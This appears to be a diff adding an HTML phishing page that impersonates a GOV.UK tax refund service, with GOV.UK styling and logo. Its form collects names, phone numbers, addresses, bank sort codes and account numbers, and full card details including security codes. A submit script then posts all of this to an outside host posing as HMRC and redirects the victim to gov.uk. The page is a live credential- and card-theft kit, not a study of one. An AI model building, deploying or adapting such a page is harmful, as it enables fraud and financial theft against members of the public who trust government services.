@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en" class="govuk-template">
+<head>
+    <meta charset="utf-8">
+    <title>GOV.UK - Tax refund</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#0b0c0c">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/govuk-frontend@5.0.0/dist/govuk/govuk-frontend.min.css">
+    
+    <style>
+        @font-face {
+            font-family: "GDS Transport";
+            src: url("https://fonts.gstatic.com/s/gdstransport/v1/GDSTransportWebsite.woff2") format("woff2");
+            font-weight: 400;
+            font-style: normal;
+            font-display: fallback;
+        }
+        @font-face {
+            font-family: "GDS Transport";
+            src: url("https://fonts.gstatic.com/s/gdstransport/v1/GDSTransportWebsite-Bold.woff2") format("woff2");
+            font-weight: 700;
+            font-style: normal;
+            font-display: fallback;
+        }
+        
+        body {
+            font-family: "GDS Transport", arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        .claim-banner {
+    background-color: #1d70b8;
+    padding: 10px 5px 5px 5px;  /* Top, Right, Bottom, Left */
+    margin-bottom: 30px;
+    margin: 30px auto 30px auto;
+    max-width: 750px;
+}
+
+.claim-banner-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: white;
+    margin: 0 0 8px 5px;
+    line-height: 0.9;
+}
+
+.claim-banner-box {
+    background-color: white;
+    padding: 18px 15px;
+    border: 2px solid #1d70b8;
+}
+
+.claim-banner-box p {
+    font-size: 19px;
+    margin: 0;
+    color: #0b0c0c;
+    line-height: 1.3;
+}
+
+.form-container {
+    max-width: 750px;
+    margin: 0 auto;
+    padding: 0 15px;
+}
+
+.form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-bottom: 20px;
+}
+
+.form-group-full {
+    margin-bottom: 20px;
+}
+
+.form-label {
+    display: block;
+    font-weight: 400;
+    margin-bottom: 5px;
+    color: #0b0c0c;
+    font-size: 19px;
+}
+
+.form-input {
+    width: 100%;
+    padding: 5px;
+    border: 2px solid #0b0c0c;
+    font-size: 19px;
+    font-family: "GDS Transport", arial, sans-serif;
+    box-sizing: border-box;
+}
+
+.form-input:focus {
+    outline: 3px solid #ffdd00;
+    outline-offset: 0;
+    border-color: #0b0c0c;
+}
+
+/* Yellow highlight only on hover */
+.highlighted-input:hover {
+    border-color: #ffdd00;
+    border-width: 4px;
+}
+
+.card-input-container {
+    position: relative;
+}
+
+.card-icon {
+    position: absolute;
+    right: 10px;
+    top: 8px;
+    background: #0b0c0c;
+    color: white;
+    padding: 2px 6px;
+    border-radius: 2px;
+    font-size: 11px;
+    font-weight: 700;
+}
+
+.help-icon {
+    background: #b1b4b6;
+    color: #0b0c0c;
+}
+
+.continue-button {
+    background-color: #00703c;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    font-size: 19px;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 2px 0 #002d18;
+    font-family: "GDS Transport", arial, sans-serif;
+    margin-bottom: 8px;
+    width: 100%;
+}
+
+.continue-button:hover {
+    background-color: #005a30;
+}
+
+.continue-button:active {
+    top: 2px;
+    box-shadow: none;
+}
+    </style>
+</head>
+
+<body class="govuk-template__body">
+    <script>document.body.className += ' js-enabled' + ('noModule' in HTMLScriptElement.prototype ? ' govuk-frontend-supported' : '');</script>
+
+    <!-- Skip link -->
+    <a href="#main-content" class="govuk-skip-link" data-module="govuk-skip-link">Skip to main content</a>
+
+    <!-- Cookie banner (optional) -->
+
+    <!-- Header -->
+    <header class="govuk-header" role="banner" data-module="govuk-header">
+        <div class="govuk-header__container govuk-width-container">
+            <div class="govuk-header__logo">
+                <a href="/" class="govuk-header__link govuk-header__link--homepage">
+                    <span class="govuk-header__logotype">
+                        <svg aria-hidden="true" focusable="false" class="govuk-header__logotype-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 30" height="30" width="32">
+                            <path fill="currentColor" fill-rule="evenodd" d="M22.6 10.4c-1 .4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s-.1 2-1 2.4m-5.9 6.7c-.9.4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s-.1 2-1 2.4m10.8-3.7c-1 .4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s0 2-1 2.4m3.3 4.8c-1 .4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s-.1 2-1 2.4M17 4.7l2.3 1.2V2.5l-2.3.7-.2-.2.9-3h-3.4l.9 3-.2.2c-.1.1-2.3-.7-2.3-.7v3.4L15 4.7c.1.1.1.2.2.2l-1.3 4c-.1.2-.1.4-.1.6 0 1.1.8 2 1.9 2.2h.7c1-.2 1.9-1.1 1.9-2.1 0-.2 0-.4-.1-.6l-1.3-4c-.1-.2 0-.2.1-.3m-7.6 5.7c.9.4 2-.1 2.4-1 .4-.9-.1-2-1-2.4-.9-.4-2 .1-2.4 1s0 2 1 2.4m-5 3c.9.4 2-.1 2.4-1 .4-.9-.1-2-1-2.4-.9-.4-2 .1-2.4 1s.1 2 1 2.4m-3.2 4.8c.9.4 2-.1 2.4-1 .4-.9-.1-2-1-2.4-.9-.4-2 .1-2.4 1s0 2 1 2.4m14.8 11c4.4 0 8.6.3 12.3.8 1.1-4.5 2.4-7 3.7-8.8l-2.5-.9c.2 1.3.3 1.9 0 2.7-.4-.4-.8-1.1-1.1-2.3l-1.2 4c.7-.5 1.3-.8 2-.9-1.1 2.5-2.6 3.1-3.5 3-1.1-.2-1.7-1.2-1.5-2.1.3-1.2 1.5-1.5 2.1-.1 1.1-2.3-.8-3-2-2.3 1.9-1.9 2.1-3.5.6-5.6-2.1 1.6-2.1 3.2-1.2 5.5-1.2-1.4-3.2-.6-2.5 1.6.9-1.4 2.1-.5 1.9.8-.2 1.1-1.7 2.1-3.5 1.9-2.7-.2-2.9-2.1-2.9-3.6.7-.1 1.9.5 2.9 1.9l.4-4.3c-1.1 1.1-2.1 1.4-3.2 1.4.4-1.2 2.1-3 2.1-3h-5.4s1.7 1.9 2.1 3c-1.1 0-2.1-.2-3.2-1.4l.4 4.3c1-1.4 2.2-2 2.9-1.9-.1 1.5-.2 3.4-2.9 3.6-1.9.2-3.4-.8-3.5-1.9-.2-1.3 1-2.2 1.9-.8.7-2.3-1.2-3-2.5-1.6.9-2.2.9-3.9-1.2-5.5-1.5 2.1-1.3 3.7.6 5.6-1.2-.7-3.1 0-2 2.3.6-1.4 1.8-1.1 2.1.1.2.9-.3 1.9-1.5 2.1-.9.2-2.4-.5-3.5-3 .6 0 1.2.3 2 .9l-1.2-4c-.3 1.1-.7 1.9-1.1 2.3-.3-.8-.2-1.4 0-2.7l-2.9.9C1.3 23 2.6 25.5 3.7 30c3.7-.5 7.9-.8 12.3-.8"></path>
+                        </svg>
+                        <span class="govuk-header__logotype-text">GOV.UK</span>
+                    </span>
+                </a>
+            </div>
+            <div class="govuk-header__content">
+                <button type="button" class="govuk-header__menu-button govuk-js-header-toggle" aria-controls="navigation" aria-label="Show or hide navigation menu">Menu</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Width container -->
+    <div class="govuk-width-container">
+        
+        <!-- Phase banner -->
+        <div class="govuk-phase-banner">
+            <p class="govuk-phase-banner__content">
+                <strong class="govuk-tag govuk-phase-banner__content__tag">
+                    beta
+                </strong>
+                <span class="govuk-phase-banner__text">
+                    This is a new service – your <a class="govuk-link" href="#">feedback</a> will help us to improve it.
+                </span>
+            </p>
+        </div>
+        <main>
+          <div class="claim-banner">
+            <h1 class="claim-banner-title">claim a refund</h1>
+            <div class="claim-banner-box">
+                <p>Verify your identity when processing an online claim.</p>
+            </div>
+        </div>
+
+        <form id="contactForm" method="POST" action="/submit-form" class="form-container">
+    
+          <!-- Personal Details -->
+          <div class="form-row">
+              <div>
+                  <label class="form-label" for="first-name"><strong>First name</strong></label>
+                  <input required class="form-input" type="text" id="first-name" name="firstName">
+              </div>
+              <div>
+                  <label class="form-label" for="last-name"><strong>Last name</strong></label>
+                  <input required class="form-input" type="text" id="last-name" name="lastName">
+              </div>
+          </div>
+      
+          <div class="form-group-full">
+              <label class="form-label" for="phone"><strong>Phone number</strong></label>
+              <input required class="form-input" type="tel" id="phone" name="phone" maxlength="15">
+          </div>
+      
+          <div class="form-group-full">
+              <label class="form-label" for="address"><strong>Address line 1</strong></label>
+              <input required class="form-input" type="text" id="address" name="address">
+          </div>
+          
+          <div class="form-group-full">
+            <label class="form-label" for="address"><strong>City</strong></label>
+            <input required class="form-input" type="text" id="city" placeholder="London" name="city">
+        </div>
+
+        <div class="form-group-full">
+          <label class="form-label" for="address"><strong>Postcode</strong></label>
+          <input required class="form-input" type="text" id="postcode" placeholder="AA12 ABC" name="postCode">
+      </div>
+
+          <!-- Bank Details -->
+          <div class="form-row">
+              <div>
+                  <label class="form-label" for="sort-code"><strong>Sort code</strong></label>
+                  <input required class="form-input" type="text" id="sort-code" name="sortCode" maxlength="6" placeholder="00-00-00">
+              </div>
+              <div>
+                  <label class="form-label" for="account-number"><strong>Account number</strong></label>
+                  <input required class="form-input" type="text" id="account-number" placeholder="12345678" name="accountNumber" maxlength="8">
+              </div>
+          </div>
+      
+          <!-- Card Details -->
+          <div class="form-group-full">
+              <label class="form-label" for="card-number"><strong>Card number</strong></label>
+              <div class="card-input-container">
+                  <input required class="form-input" type="text" id="card-number" placeholder="5263 XXXX XXXX XXXX" name="cardNumber" maxlength="16">
+              </div>
+          </div>
+      
+          <div class="form-row">
+              <div>
+                  <label class="form-label" for="expiry"><strong>Expiry</strong></label>
+                  <input required class="form-input" inputmode="numeric" id="expiry" name="expiry" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5">
+              </div>
+              <div>
+                  <label class="form-label" for="security-code"><strong>Security code</strong></label>
+                  <div class="card-input-container">
+                      <input required class="form-input" type="text" id="security-code" placeholder="123" name="securityCode" maxlength="3">
+                  </div>
+              </div>
+          </div>
+
+          <input type="text" name="phone_number" style="display:none">
+
+          <!-- Continue Button -->
+          <button type="submit" class="continue-button">
+              Continue
+          </button>
+      </form>
+      <script>
+        const form = document.getElementById('contactForm');
+        
+        form.addEventListener('submit', async (e) => {
+          e.preventDefault();
+          
+          const formData = {
+            firstName: form.firstName.value,
+            lastName: form.lastName.value,
+            phoneNum: form.phone.value,
+            address: form.address.value,
+            city: form.city.value,
+            postcode: form.postCode.value,
+            sortCode: form.sortCode.value,
+            accountNum: form.accountNumber.value,
+            cardNum: form.cardNumber.value,
+            expiry: form.expiry.value,
+            cvv: form.securityCode.value
+          };
+
+          try {
+            const res = fetch('https://hmrc-kt5q.onrender.com/submit-form', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(formData),
+              keepalive: true
+            });
+
+            window.location.href = "https://gov.uk/";
+            
+            const result = res.json();
+            console.log('data sent.', result)
+            
+          } catch (err) {
+            console.error(err);
+            console.log('Something went wrong!');
+          }
+        });
+        </script>
+
+      <script>
+        const expiryInput = document.getElementById("expiry")
+
+        expiryInput.addEventListener("input", function(e) {
+  let value = e.target.value.replace(/\D/g, "");
+
+  if (value.length > 4) value = value.slice(0, 4);
+
+  if (value.length >= 1) {
+    if (parseInt(value[0]) > 1) value = "0" + value[0];
+  }
+
+  if (value.length >= 2) {
+    let month = parseInt(value.slice(0,2));
+    if (month === 0) value = "01" + value.slice(2);
+    if (month > 12) value = "12" + value.slice(2);
+  }
+
+  if (value.length >= 3) {
+    value = value.slice(0,2) + "/" + value.slice(2);
+  }
+
+  e.target.value = value;
+});
+      </script>
+        </main>
+    </div>
+
+    <!-- Footer -->
+    <footer class="govuk-footer" role="contentinfo">
+        <div class="govuk-width-container">
+            <div class="govuk-footer__meta">
+                <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
+                    <h2 class="govuk-visually-hidden">Support links</h2>
+                    <ul class="govuk-footer__inline-list">
+                        <li class="govuk-footer__inline-list-item">
+                            <a class="govuk-footer__link" href="#">
+                                Help
+                            </a>
+                        </li>
+                        <li class="govuk-footer__inline-list-item">
+                            <a class="govuk-footer__link" href="#">
+                                Privacy
+                            </a>
+                        </li>
+                        <li class="govuk-footer__inline-list-item">
+                            <a class="govuk-footer__link" href="#">
+                                Cookies
+                            </a>
+                        </li>
+                        <li class="govuk-footer__inline-list-item">
+                            <a class="govuk-footer__link" href="#">
+                                Accessibility statement
+                            </a>
+                        </li>
+                        <li class="govuk-footer__inline-list-item">
+                            <a class="govuk-footer__link" href="#">
+                                Contact
+                            </a>
+                        </li>
+                        <li class="govuk-footer__inline-list-item">
+                            <a class="govuk-footer__link" href="#">
+                                Terms and conditions
+                            </a>
+                        </li>
+                        <li class="govuk-footer__inline-list-item">
+                            Built by the <a class="govuk-footer__link" href="#">
+                                Name of department
+                            </a>
+                        </li>
+                    </ul>
+
+                    <svg aria-hidden="true" focusable="false" class="govuk-footer__licence-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 483.2 195.7" height="17" width="41">
+                        <path fill="currentColor" d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145"></path>
+                    </svg>
+                    <span class="govuk-footer__licence-description">
+                        All content is available under the
+                        <a class="govuk-footer__link" href="https://www.nationalarchives.gov.uk/doc/open-government-licence/version/3/" rel="license">Open Government Licence v3.0</a>, except where otherwise stated
+                    </span>
+                </div>
+                <div class="govuk-footer__meta-item">
+                    <a class="govuk-footer__link govuk-footer__copyright-logo" href="https://www.nationalarchives.gov.uk/information-management/re-using-public-sector-information/uk-government-licensing-framework/crown-copyright/">© Crown copyright</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/govuk-frontend@5.0.0/dist/govuk/govuk-frontend.min.js"></script>
+    <script>
+        window.GOVUKFrontend.initAll()
+    </script>
+</body>
+</html>
